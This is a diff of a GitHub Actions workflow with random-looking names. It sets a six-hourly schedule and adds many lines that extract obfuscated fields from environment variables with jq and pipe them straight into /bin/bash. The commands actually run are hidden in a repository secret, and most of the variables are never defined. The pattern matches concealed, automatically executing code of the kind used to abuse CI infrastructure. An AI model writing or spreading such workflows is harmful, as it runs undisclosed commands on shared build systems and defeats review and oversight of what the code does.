@@ -1,21 +1,31 @@
 name: chenglidai8018
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 0/6 * * *'
+    - cron: '21 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chenglidai8018
         env:
-          rwkn61: ${{ secrets.rwkn61 }}
+          im16: ${{ secrets.im16 }}
         run: |
-          echo $rwkn61 | jq -r .vk096 | /bin/bash
-          echo $o401 | jq -r .zfqct3 | /bin/bash
-          echo $t9 | jq -r .ulnq3873 | /bin/bash
-          echo $ycboi6 | jq -r .q135 | /bin/bash
-          echo $ynru98174 | jq -r .rr79842 | /bin/bash
+          echo $im16 | jq -r .rjg5430 | /bin/bash
+          echo $umun0 | jq -r .yb0 | /bin/bash
+          echo $e478 | jq -r .yroiq71638 | /bin/bash
+          echo $uwxuw3440 | jq -r .qss4492 | /bin/bash
+          echo $iwy97565 | jq -r .w6347 | /bin/bash
+          echo $egiy6 | jq -r .trezk038 | /bin/bash
+          echo $yc7 | jq -r .bobtx3 | /bin/bash
+          echo $nlln678 | jq -r .voh79 | /bin/bash
+          echo $mcq542 | jq -r .jns56 | /bin/bash
+          echo $fao79562 | jq -r .zkss1 | /bin/bash
+          echo $igc5468 | jq -r .jlqy30 | /bin/bash
+          echo $v1785 | jq -r .bdyro713 | /bin/bash
+          echo $vsn4290 | jq -r .hpvy23 | /bin/bash
+          echo $rtlc69 | jq -r .rp5226 | /bin/bash
 
